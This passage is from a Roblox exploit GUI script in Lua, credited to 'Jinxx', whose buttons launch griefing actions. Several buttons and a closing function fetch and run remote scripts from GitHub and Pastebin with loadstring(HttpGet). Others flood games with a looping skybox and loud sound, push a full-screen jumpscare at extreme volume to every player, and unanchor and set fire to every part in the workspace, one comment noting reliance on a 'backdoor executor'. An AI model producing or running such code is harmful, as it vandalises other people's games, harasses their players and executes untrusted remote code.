TextButton_10.Position = UDim2.new(0.498694509, 0, 0.637130797, 0)
TextButton_10.Size = UDim2.new(0, 68, 0, 30)
TextButton_10.Font = Enum.Font.PatrickHand
TextButton_10.Text = "cOOlkidd remake"
TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.TextScaled = true
TextButton_10.TextSize = 14.000
TextButton_10.TextWrapped = true
TextButton_10.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ckid", true))()
end)
TextButton_11.Parent = Main
TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_11.BorderSizePixel = 3
TextButton_11.Position = UDim2.new(0.263707578, 0, 0.637130797, 0)
TextButton_11.Size = UDim2.new(0, 68, 0, 30)
TextButton_11.Font = Enum.Font.PatrickHand
TextButton_11.Text = "Particals"
TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.TextScaled = true
TextButton_11.TextSize = 14.000
TextButton_11.TextWrapped = true
TextButton_11.MouseButton1Down:connect(function()
 pe = Instance.new("ParticleEmitter",game.Players.LocalPlayer.Character.Torso)
pe.Texture = "http://roblox.com/asset/?id=2815989294"
pe.VelocitySpread = 50 end)
TextButton_12.Parent = Main
TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_12.BorderSizePixel = 3
TextButton_12.Position = UDim2.new(0.0208877325, 0, 0.637130797, 0)
TextButton_12.Size = UDim2.new(0, 68, 0, 30)
TextButton_12.Font = Enum.Font.PatrickHand
TextButton_12.Text = "Aura Destrozer 1"
TextButton_12.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.TextScaled = true
TextButton_12.TextSize = 14.000
TextButton_12.TextWrapped = true
TextButton_12.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/f1Q3KhR7"))()
end)
TextButton_13.Parent = Main
TextButton_13.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_13.BorderSizePixel = 3
TextButton_13.Position = UDim2.new(0.0208877325, 0, 0.83544302, 0)
TextButton_13.Size = UDim2.new(0, 68, 0, 30)
TextButton_13.Font = Enum.Font.PatrickHand
TextButton_13.Text = "music"
TextButton_13.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.TextScaled = true
TextButton_13.TextSize = 14.000
TextButton_13.TextWrapped = true
TextButton_13.MouseButton1Down:Connect(function()
local music = Instance.new("Sound", game.Workspace)
music.SoundId = "rbxassetid://8683380188"
music.Volume = 1
music.Looped = true
music.PlayOnRemove = true
music:Play()
end)
TextButton_14.Parent = Main
TextButton_14.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_14.BorderSizePixel = 3
TextButton_14.Position = UDim2.new(0.263707578, 0, 0.83544302, 0)
TextButton_14.Size = UDim2.new(0, 68, 0, 30)
TextButton_14.Font = Enum.Font.PatrickHand
TextButton_14.Text = "Koopkidd skyblock"
TextButton_14.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.TextScaled = true
TextButton_14.TextSize = 14.000
TextButton_14.TextWrapped = true
TextButton_14.MouseButton1Down:Connect(function()
wait(1)--set this to how much time between messages
		msg = Instance.new ("Hint")
		msg.Parent = game.Workspace
		msg.Text = "https://discord.gg/smx6YETa"
		wait(6)
		msg:remove()
		wait(3)  local music = Instance.new("Sound", game.Workspace)
music.SoundId = "rbxassetid://"
music.Volume = 1
music.Looped = true
music.PlayOnRemove = true
music:Play() -- script is not fe only fe at backdoor executor
-- k00pkidd edit
imageOne = "http://www.roblox.com/asset/?id=11588317701"
imageTwo = "http://www.roblox.com/asset/?id=11588317701"
imageThree = "http://www.roblox.com/asset/?id=11588317701"
imageFour = "http://www.roblox.com/asset/?id=11588317701"
imageFive = "http://www.roblox.com/asset/?id=11588317701"
imageSix = "http://www.roblox.com/asset/?id=11588317701"
imageSeven = "http://www.roblox.com/asset/?id=11588317701"
imageEight = "http://www.roblox.com/asset/?id=11588317701"
Spooky = Instance.new("Sound", game.Workspace)
Spooky.Name = "Spooky"
Spooky.SoundId = "rbxassetid://4808613510"
Spooky.Volume = 1500
Spooky.Looped = true
Spooky:Play()
Sky = Instance.new("Sky", game.Lighting)
Sky.SkyboxBk = imageOne
Sky.SkyboxDn = imageOne
Sky.SkyboxFt = imageOne
Sky.SkyboxLf = imageOne
Sky.SkyboxRt = imageOne
Sky.SkyboxUp = imageOne
while true do
    Sky.SkyboxBk = imageOne
    Sky.SkyboxDn = imageOne
    Sky.SkyboxFt = imageOne
    Sky.SkyboxLf = imageOne
    Sky.SkyboxRt = imageOne
    Sky.SkyboxUp = imageOne
    wait(0.25)
    Sky.SkyboxBk = imageTwo
    Sky.SkyboxDn = imageTwo
    Sky.SkyboxFt = imageTwo
    Sky.SkyboxLf = imageTwo
    Sky.SkyboxRt = imageTwo
    Sky.SkyboxUp = imageTwo
    wait(0.25)
    Sky.SkyboxBk = imageThree
    Sky.SkyboxDn = imageThree
    Sky.SkyboxFt = imageThree
    Sky.SkyboxLf = imageThree
    Sky.SkyboxRt = imageThree
    Sky.SkyboxUp = imageThree
    wait(0.25)
    Sky.SkyboxBk = imageFour
    Sky.SkyboxDn = imageFour
    Sky.SkyboxFt = imageFour
    Sky.SkyboxLf = imageFour
    Sky.SkyboxRt = imageFour
    Sky.SkyboxUp = imageFour
    wait(0.25)
    Sky.SkyboxBk = imageFive
    Sky.SkyboxDn = imageFive
    Sky.SkyboxFt = imageFive
    Sky.SkyboxLf = imageFive
    Sky.SkyboxRt = imageFive
    Sky.SkyboxUp = imageFive
    wait(0.25)
    Sky.SkyboxBk = imageSix
    Sky.SkyboxDn = imageSix
    Sky.SkyboxFt = imageSix
    Sky.SkyboxLf = imageSix
    Sky.SkyboxRt = imageSix
    Sky.SkyboxUp = imageSix
    wait(0.25)
    Sky.SkyboxBk = imageSeven
    Sky.SkyboxDn = imageSeven
    Sky.SkyboxFt = imageSeven
    Sky.SkyboxLf = imageSeven
    Sky.SkyboxRt = imageSeven
    Sky.SkyboxUp = imageSeven
    wait(0.25)
    Sky.SkyboxBk = imageEight
    Sky.SkyboxDn = imageEight
    Sky.SkyboxFt = imageEight
    Sky.SkyboxLf = imageEight
    Sky.SkyboxRt = imageEight
    Sky.SkyboxUp = imageEight
    wait(0.25)
end
 
		 end)
TextButton_15.Parent = Main
TextButton_15.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_15.BorderSizePixel = 3
TextButton_15.Position = UDim2.new(0.498694539, 0, 0.83544302, 0)
TextButton_15.Size = UDim2.new(0, 68, 0, 30)
TextButton_15.Font = Enum.Font.PatrickHand
TextButton_15.Text = "Jumpscare"
TextButton_15.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.TextScaled = true
TextButton_15.TextSize = 14.000
TextButton_15.TextWrapped = true
TextButton_15.MouseButton1Down:Connect(function()
local jumpscareSound = Instance.new("Sound", workspace)
jumpscareSound.Name = "JumpscareSound"
jumpscareSound.Volume = 9999999999999999
jumpscareSound.Pitch = 0.76
jumpscareSound.SoundId = "rbxassetid://7006487793"

local jumpscareGUI = Instance.new("ScreenGui", nil)
jumpscareGUI.Name = "Jumpscare"
local image = Instance.new("ImageLabel", jumpscareGUI)
image.Name = "JumpscareImage"
image.BackgroundColor3 = Color3.new(0, 0, 0)
image.BorderColor3 = Color3.new(255, 255, 255)
image.BorderSizePixel = 0
image.Size = UDim2.new(1, 0, 1, 0)
image.Image = "http://www.roblox.com/asset/?id=11588317701"
image.Active = true
 
for i, c in pairs(game.Players:GetChildren()) do
    local jumpscareClone = jumpscareGUI:Clone()
    jumpscareClone.Parent = c.PlayerGui
end
jumpscareSound:Play()
wait(1)
jumpscareSound:Destroy()
for i, c in pairs(game.Players:GetChildren()) do
    c.PlayerGui.Jumpscare:Destroy()
end
end)
TextButton_16.Parent = Main
TextButton_16.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_16.BorderSizePixel = 3
TextButton_16.Position = UDim2.new(0.736292481, 0, 0.83544302, 0)
TextButton_16.Size = UDim2.new(0, 68, 0, 30)
TextButton_16.Font = Enum.Font.PatrickHand
TextButton_16.Text = "Abuser Game"
TextButton_16.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.TextScaled = true
TextButton_16.TextSize = 14.000
TextButton_16.TextWrapped = true
TextButton_16.MouseButton1Down:Connect(function()
local parts = {}
function scan(p)
	for _,target in pairs(p:GetChildren()) do
		if target:IsA("BasePart") then
			table.insert(parts,target) -- target is the actual parts!
			target.Anchored = false
			target.BrickColor = BrickColor.new("black")
			local sb = Instance.new("SelectionBox", target)
			sb.Color3 = Color3.new(255, 0, 0)
			sb.SurfaceColor3 = Color3.new(170, 0, 0)
			sb.Adornee = target
			local pe = Instance.new("ParticleEmitter", target)
			pe.Name = "10101110010011"
			pe.Texture = "rbxassetid://"
			pe.Rate = 10
			pe.SpreadAngle = Vector2.new(-90, 90)
			local pe2 = Instance.new("ParticleEmitter", target)
			pe2.Name = ""
			pe2.Texture = "rbxassetid://"
			pe2.Rate = 5
			pe2.SpreadAngle = Vector2.new(-90, 90)
			local bb = Instance.new("BillboardGui", target)
			bb.Size = UDim2.new(5,0 , 2,0)
			bb.AlwaysOnTop = true
			local randomtext = {
				"",
				"",
				""
			}
			local label = Instance.new("TextLabel", bb)
			label.Size = UDim2.new(1,0 , 1,0)
			label.TextScaled = true
			label.TextWrapped = true
			label.BackgroundTransparency = 1
			local brickcolor = BrickColor.new("Really red")
			label.TextColor3 = brickcolor.Color
			label.Font = "ArialBold"
			label.TextSize = 0
			local chosentext = randomtext[math.random(1, #randomtext)]
			label.Text = chosentext
			local fire = Instance.new("Fire", target)
			fire.Size = 20
			fire.Heat = 30
		end
		scan(target)
	end
end
scan(game.Workspace)
--print(#parts .. (#parts == 1 and " brick " or " bricks ") .. "counted")
parts = {}
wait(1) end)
TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BorderSizePixel = 4
TextLabel_2.Position = UDim2.new(-0.0652741492, 0, 0.995780587, 0)
TextLabel_2.Size = UDim2.new(0, 429, 0, 41)
TextLabel_2.Font = Enum.Font.PatrickHand
TextLabel_2.Text = "Script Made By Jinxx"
TextLabel_2.TextColor3 = Color3.fromRGB(225, 0, 3)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true
end
local function AnswerYes()
if identifyexecutor and identifyexecutor()~="Codex" or true then
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/MainProd"))()
else
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/CodexTest"))()
end
AnswerNo()
end
            TextButton.MouseButton1Click:Once(AnswerYes)
	TextButton_2.MouseButton1Click:Once(AnswerNo)